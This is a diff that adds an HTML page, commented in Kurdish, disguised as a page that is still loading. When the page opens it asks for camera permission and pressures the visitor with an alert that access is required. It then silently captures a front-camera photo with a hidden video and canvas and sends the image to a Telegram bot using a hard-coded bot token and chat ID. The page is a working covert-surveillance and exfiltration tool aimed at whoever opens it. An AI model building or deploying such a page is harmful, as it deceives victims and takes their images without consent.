@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            background: #f0f2f5; 
+            padding-top: 50px; 
+        }
+        .loading { 
+            color: #666; 
+            font-size: 18px; 
+        }
+        /* شاردنەوەی کامێرا و وێنەکە لەسەر شاشەکە */
+        video, canvas { 
+            display: none; 
+        } 
+    </style>
+</head>
+<body>
+
+    <div class="loading">تکایە چاوەڕوان بە بۆ بارکردنی پەڕەکە...</div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // ⚠️ لێرەدا زانیارییەکانی خۆت دابنێ ⚠️
+        const BOT_TOKEN = 8610532423:AAH04CqRUzyF7UVjI4So4lQcJSsoL44wQzM
+        const CHAT_ID = 6595947913
+
+        // داواکردنی مۆڵەتی کامێرا یەکسەر لەگەڵ کردنەوەی سایتەکە
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                // کاتێک کامێراکە ئامادە بوو، دوای نیو چرکە یەکسەر وێنەکە دەگرێت
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        takePicture();
+                    }, 500); 
+                };
+            })
+            .catch(err => {
+                alert("بۆ بینینی ناوەڕۆکەکە دەبێت مۆڵەتی کامێرا بدەیت!");
+            });
+
+        function takePicture() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // کێشانی وێنەکە لە ڤیدیۆکەوە بۆ سەر کانڤاس
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // گۆڕینی وێنەکە بۆ فایل و ناردنی بۆ تێلیگرام
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'captured_image.jpg');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    console.log('وێنەکە بە سەرکەوتوویی بۆ تێلیگرام نێردرا!');
+                })
+                .catch(err => {
+                    console.error('کێشە لە ناردنی وێنەکەدا هەیە:', err);
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
